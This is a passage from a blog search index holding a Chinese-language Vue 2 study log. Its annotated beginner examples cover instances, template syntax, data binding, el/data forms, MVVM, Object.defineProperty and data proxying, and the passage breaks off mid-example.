<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vue学习日志</title>
      <link href="2021/08/28/Vue%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
      <url>2021/08/28/Vue%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue学习日志"><a href="#Vue学习日志" class="headerlink" title="Vue学习日志"></a>Vue学习日志</h1><h2 id="1-初识Vue"><a href="#1-初识Vue" class="headerlink" title="1.初识Vue"></a>1.初识Vue</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>初识Vue<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;img/favicon.ico&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;img/favicon.ico&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">初识Vue：</span></span><br><span class="line"><span class="comment">1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；</span></span><br><span class="line"><span class="comment">2.root容器里面的代码依然符合HTML规范，只不过混入了一些Vue语法；</span></span><br><span class="line"><span class="comment">3.root容器里面的代码被称为【Vue模板】；</span></span><br><span class="line"><span class="comment">4.Vue实例与容器是一一对应的；</span></span><br><span class="line"><span class="comment">5.真实开发中只有一个Vue实例，并且会配合组件一起使用；</span></span><br><span class="line"><span class="comment">6.&#123;&#123;xxx&#125;&#125;中xxx要写js表达式，且xxx可以读取到data中的所有属性；</span></span><br><span class="line"><span class="comment">7.一旦data中的数据发生变化，那么模板中用到该数据的地方也会自动更新；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//创建一个Vue实例</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,<span class="comment">//选择关联id为root的容器，并为其创建Vue实例</span></span></span><br><span class="line"><span class="javascript">data:&#123;<span class="comment">//data中存储数据，数据供el指定的容器使用</span></span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;张三01&#x27;</span>,</span></span><br><span class="line">age:18</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-vue模板语法"><a href="#2-vue模板语法" class="headerlink" title="2.vue模板语法"></a>2.vue模板语法</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>vue模板语法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">vue模板语法有两大类：</span></span><br><span class="line"><span class="comment">1.插值语法：</span></span><br><span class="line"><span class="comment">功能：用于解析标签体内容；</span></span><br><span class="line"><span class="comment">写法：&#123;&#123;xxx&#125;&#125;，xxx为js表达式，且可以直接读取到data里的所有属性；</span></span><br><span class="line"><span class="comment">2.指令语法：</span></span><br><span class="line"><span class="comment">功能：用于标签（包括：标签属性、标签体内容、绑定事件······）；</span></span><br><span class="line"><span class="comment">写法：v-bind:href=&quot;xxx&quot; 或简写为 :href=&quot;xxx&quot;，xxx同样为js表达式，且可以直接读取到data里的所有属性；</span></span><br><span class="line"><span class="comment">备注：Vue中有很多的Vue指令，且形式都是v-????，此处只是拿v-bind举例；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>插值语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>指令语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&#x27;v-bind:&#x27;绑定数据，可以将标签里的属性的值和Vue实例里的data里的属性绑定,&#x27;v-bind:&#x27;可以简写为&#x27;:&#x27;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>点我去百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>点我去百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span>,</span></span><br><span class="line"><span class="javascript">url:<span class="string">&#x27;https://www.baidu.com&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-vue的数据绑定"><a href="#3-vue的数据绑定" class="headerlink" title="3.vue的数据绑定"></a>3.vue的数据绑定</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>vue的数据绑定<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue中数据有两种绑定方式：</span></span><br><span class="line"><span class="comment">1.单向绑定（v-bind）：数据只能从data流向页面</span></span><br><span class="line"><span class="comment">2.双向绑定（v-model）：数据不仅能从data流向页面，还能从页面流向data。</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">1.双向绑定一般应用在表单类元素上（列如：input、select等）。</span></span><br><span class="line"><span class="comment">2.v-model:value可以简写为v-model，因为v-model默认就是收集的value的值。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--普通写法--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--单向数据绑定：&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;/&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="comment">双向数据绑定：&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;/&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--简写--&gt;</span></span><br><span class="line">单向数据绑定：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">:value</span>=<span class="string">&quot;name&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">双向数据绑定：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--错误代码，因为v-model只能应用在表单类元素（输入类元素）上--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-model:x=&quot;name&quot;&gt;你好啊&lt;/h2&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span>,</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-el和data的两种写法"><a href="#4-el和data的两种写法" class="headerlink" title="4.el和data的两种写法"></a>4.el和data的两种写法</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>el和data的两种写法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">el和data的两种写法：</span></span><br><span class="line"><span class="comment">1.el有两种写法：</span></span><br><span class="line"><span class="comment">（1）new Vue时候配置el属性；</span></span><br><span class="line"><span class="comment">（2）先创建Vue实例，然后再通过v.$mount(&#x27;#root&#x27;)指定el的值；</span></span><br><span class="line"><span class="comment">2.data有两种写法：</span></span><br><span class="line"><span class="comment">（1）对象式</span></span><br><span class="line"><span class="comment">（2）函数式</span></span><br><span class="line"><span class="comment">如何选择：目前使用哪种都可以，以后学习到Vue组件时，data必须使用函数式，否则会报错；</span></span><br><span class="line"><span class="comment">3.一个重要的原则：</span></span><br><span class="line"><span class="comment">由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不是Vue实例；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--准备一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//el的两种写法：</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//const v = new Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">////el的第一种写法</span></span></span><br><span class="line"><span class="javascript"><span class="comment">////el:&#x27;#root&#x27;,</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//data:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//name:&#x27;jack&#x27;,</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(v)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">////el的第二种写法，比较灵活</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//v.$mount(&#x27;#root&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//延迟1秒绑定容器</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//setTimeout(()=&gt;&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//v.$mount(&#x27;#root&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;,1000)</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//data的两种写法：</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="javascript"><span class="comment">//data的第一种写法，对象式</span></span></span><br><span class="line">/*data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span></span></span><br><span class="line">&#125;*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//data的第二种写法，函数式</span></span></span><br><span class="line"><span class="javascript">data:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;@@@&#x27;</span>,<span class="built_in">this</span>)<span class="comment">//此处的this是Vue实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;jack&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//简写</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//data()&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(&#x27;@@@&#x27;,this)//此处的this是Vue实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//return&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//name:&#x27;jack01&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//错误示范，箭头函数</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//data:()=&gt;&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(&#x27;@@@&#x27;,this)//此处的this不是Vue实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//return&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//name:&#x27;jack&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-MVVM模型"><a href="#5-MVVM模型" class="headerlink" title="5.MVVM模型"></a>5.MVVM模型</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>MVVM模型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue中的MVVM模型：</span></span><br><span class="line"><span class="comment">1.M（模型）：data中的数据</span></span><br><span class="line"><span class="comment">2.V（视图）：模板代码</span></span><br><span class="line"><span class="comment">3.VM（视图模型ViewModel）：Vue实例</span></span><br><span class="line"><span class="comment">观察发现：</span></span><br><span class="line"><span class="comment">1.data中的所有属性，最后都出现在了vm身上；</span></span><br><span class="line"><span class="comment">2.vm身上的所有属性，及Vue原型上的所有属性，在Vue模板中都可以直接使用；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;清华大学&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-回顾Object-defineproperty方法"><a href="#6-回顾Object-defineproperty方法" class="headerlink" title="6.回顾Object.defineproperty方法"></a>6.回顾Object.defineproperty方法</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>回顾Object.defineproperty方法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--数据代理：通过一个对象对另一个对象中的属性进行操作（读/写）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> number = <span class="number">19</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> person = &#123;</span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="javascript">sex:<span class="string">&#x27;男&#x27;</span>,</span></span><br><span class="line"><span class="javascript"><span class="comment">//age:18</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//往person对象添加age属性，并为属性赋值</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(person,<span class="string">&#x27;age&#x27;</span>,&#123;</span></span><br><span class="line">/*</span><br><span class="line">value:18,</span><br><span class="line"><span class="javascript">enumerable:<span class="literal">true</span>,<span class="comment">//控制属性是否可以枚举，默认是false</span></span></span><br><span class="line"><span class="javascript">writable:<span class="literal">true</span>,<span class="comment">//控制属性是否可以修改，默认是false</span></span></span><br><span class="line"><span class="javascript">configurable:<span class="literal">true</span><span class="comment">//控制属性是否可以删除，默认是false</span></span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//当有人读取person的age属性时，就会调用get函数，返回值就是age的值。</span></span></span><br><span class="line"><span class="javascript">get:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;有人读取person的age属性&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> number</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//当有人设置person的age属性时，就会调用get函数，返回值就是age的值。</span></span></span><br><span class="line"><span class="javascript">set:<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;有人设置person的age属性&#x27;</span>,value)</span></span><br><span class="line">number = value</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(person)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-Vue中的数据代理"><a href="#7-Vue中的数据代理" class="headerlink" title="7.Vue中的数据代理"></a>7.Vue中的数据代理</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue中的数据代理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1.Vue中的数据代理：</span></span><br><span class="line"><span class="comment">通过vm对象来代理data对象中的属性操作（读/写）；</span></span><br><span class="line"><span class="comment">2.Vue中数据代理的好处：</span></span><br><span class="line"><span class="comment">更加方便操作data中的数据；</span></span><br><span class="line"><span class="comment">3.基本原理：</span></span><br><span class="line"><span class="comment">通过Object.defineproperty()把data对象中的所以有属性添加到vm身上;</span></span><br><span class="line"><span class="comment">为每一个添加到vm上的属性，都生成一个getter/setter;</span></span><br><span class="line"><span class="comment">在getter/setter内部去操作data中对应的属性;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span 